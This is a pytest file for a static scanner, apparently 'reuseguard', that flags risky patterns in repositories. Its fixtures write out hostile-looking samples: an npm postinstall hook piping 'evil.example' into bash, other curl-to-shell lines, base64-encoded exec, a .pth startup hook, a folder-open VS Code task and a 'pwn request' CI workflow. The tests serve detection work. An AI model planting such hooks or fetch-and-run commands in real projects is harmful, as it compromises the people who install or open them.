"""Tests for the built-in static scanner."""

from __future__ import annotations

from pathlib import Path

from reuseguard.adapters.scanner import ScanLimits, scan_directory
from reuseguard.models import RiskLevel, ScanStatus


def _write(root: Path, files: dict[str, str | bytes]) -> None:
    for relative, content in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")


def test_clean_repository_has_no_findings(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {
            "README.md": "# Demo\n\nA small client.\n",
            "app.py": "def get(url: str) -> str:\n    return url\n",
        },
    )

    report = scan_directory(tmp_path)

    assert report.status is ScanStatus.SCANNED
    assert report.risk is RiskLevel.NONE
    assert report.findings == []
    assert report.files_scanned == 2


def test_readme_download_snippet_is_suppressed(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {
            "README.md": "# Demo\n\n```bash\ncurl https://example.com/install.sh | bash\n```\n",
            "app.py": "x = 1\n",
        },
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.NONE
    assert report.effective_findings == []
    assert any(finding.rule_id == "download-pipe-shell" for finding in report.suppressed_findings)


def test_root_package_json_lifecycle_script_is_high_risk(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {
            "package.json": (
                '{"name":"x","scripts":{"postinstall":'
                '"curl -fsSL https://evil.example/install.sh | bash"}}'
            )
        },
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.HIGH
    assert any(
        finding.rule_id == "npm-lifecycle" and finding.severity is RiskLevel.HIGH
        for finding in report.effective_findings
    )


def test_fixture_package_json_is_suppressed(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {
            "tests/fixtures/package.json": (
                '{"name":"x","scripts":{"postinstall":"curl https://e.example/x | bash"}}'
            )
        },
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.NONE
    assert report.effective_findings == []
    assert report.suppressed_findings


def test_python_encoded_execution_is_critical(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {"app.py": ("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")},
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.CRITICAL
    assert any(finding.rule_id == "py-encoded-exec" for finding in report.effective_findings)


def test_method_named_eval_is_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path, {"app.py": "result = query.eval(value=1)\n"})

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.NONE


def test_eval_method_definition_is_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path, {"app.py": "def eval(self, *columns):\n    return columns\n"})

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.NONE


def test_generated_vendor_bundle_is_skipped(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {"vendor-bundle.js": "eval('x');\n" + "a" * 3000 + "\n"},
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.NONE
    assert report.files_scanned == 0
    assert report.files_skipped == 1


def test_minified_package_json_is_still_scanned(tmp_path: Path) -> None:
    payload = (
        '{"description":"'
        + "a" * 3000
        + '","scripts":{"postinstall":"curl https://example.com/x | bash"}}'
    )
    _write(tmp_path, {"package.json": payload})

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.HIGH
    assert any(finding.rule_id == "npm-lifecycle" for finding in report.effective_findings)


def test_repeated_bidi_characters_on_one_line_are_deduplicated(tmp_path: Path) -> None:
    _write(tmp_path, {"app.py": "x = 1  # \u202e\u202e\u202e\n"})

    report = scan_directory(tmp_path)

    assert len([f for f in report.effective_findings if f.rule_id == "unicode-bidi"]) == 1


def test_private_key_is_medium_not_blocking(tmp_path: Path) -> None:
    _write(tmp_path, {"certs.py": 'KEY = "-----BEGIN PRIVATE KEY-----"\n'})

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.MEDIUM


def test_prefixed_test_directory_is_suppressed(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {"test_elasticsearch/test_document.py": "import pickle\nvalue = pickle.loads(blob)\n"},
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.NONE
    assert report.effective_findings == []
    assert report.suppressed_findings


def test_pickle_alone_is_medium_risk(tmp_path: Path) -> None:
    _write(tmp_path, {"app.py": "import pickle\nvalue = pickle.loads(blob)\n"})

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.MEDIUM


def test_unsafe_deserialization_and_bidi_are_reported(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {
            "app.py": "import pickle\ndata = pickle.loads(blob)\nx = '\u202e hidden'\n",
        },
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.HIGH
    rules = {finding.rule_id for finding in report.effective_findings}
    assert {"py-unsafe-deserialize", "unicode-bidi"} <= rules


def test_pth_startup_hook_is_reported(tmp_path: Path) -> None:
    _write(tmp_path, {"sitecustomize.pth": "import os; os.system('id')\n"})

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.HIGH
    assert any(finding.rule_id == "pth-startup-code" for finding in report.effective_findings)


def test_vscode_folder_open_task_is_reported(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {".vscode/tasks.json": '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}'},
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.HIGH
    assert any(finding.rule_id == "vscode-folder-open" for finding in report.effective_findings)


def test_pwn_request_workflow_is_critical(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {
            ".github/workflows/ci.yml": (
                "on:\n"
                "  pull_request_target:\n"
                "jobs:\n"
                "  test:\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "        with:\n"
                "          ref: ${{ github.event.pull_request.head.sha }}\n"
            )
        },
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.CRITICAL
    assert any(finding.rule_id == "ci-pwn-request" for finding in report.effective_findings)


def test_dockerfile_remote_add_is_medium(tmp_path: Path) -> None:
    _write(tmp_path, {"Dockerfile": "FROM python:3.11\nADD https://example.com/x /x\n"})

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.MEDIUM
    assert any(finding.rule_id == "docker-add-url" for finding in report.effective_findings)


def test_lockfiles_node_modules_and_binaries_are_skipped(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {
            "package-lock.json": '{"x":"eval(1)"}',
            "node_modules/dep/index.js": "eval('x')",
            "image.js": b"\x00\x01\x02binary",
            "app.py": "x = 1\n",
        },
    )

    report = scan_directory(tmp_path)

    assert report.risk is RiskLevel.NONE
    assert report.files_scanned == 1
    assert report.files_skipped == 1


def test_max_files_marks_report_truncated(tmp_path: Path) -> None:
    _write(tmp_path, {"a.py": "x = 1\n", "b.py": "y = 2\n", "c.py": "z = 3\n"})

    report = scan_directory(tmp_path, limits=ScanLimits(max_files=1))

    assert report.files_scanned == 1
    assert report.truncated is True


def test_large_file_is_skipped_without_truncation(tmp_path: Path) -> None:
    _write(tmp_path, {"big.py": "x = 1\n" * 100})

    report = scan_directory(tmp_path, limits=ScanLimits(max_file_bytes=10))

    assert report.files_scanned == 0
    assert report.files_skipped == 1
    assert report.truncated is False


def test_empty_directory_scans_successfully(tmp_path: Path) -> None:
    report = scan_directory(tmp_path)

    assert report.status is ScanStatus.SCANNED
    assert report.files_scanned == 0
    assert report.risk is RiskLevel.NONE


def test_missing_directory_is_an_error(tmp_path: Path) -> None:
    report = scan_directory(tmp_path / "missing")

    assert report.status is ScanStatus.ERROR
    assert report.error


def test_invalid_package_json_does_not_crash(tmp_path: Path) -> None:
    _write(tmp_path, {"package.json": "{not json"})

    report = scan_directory(tmp_path)

    assert report.status is ScanStatus.SCANNED
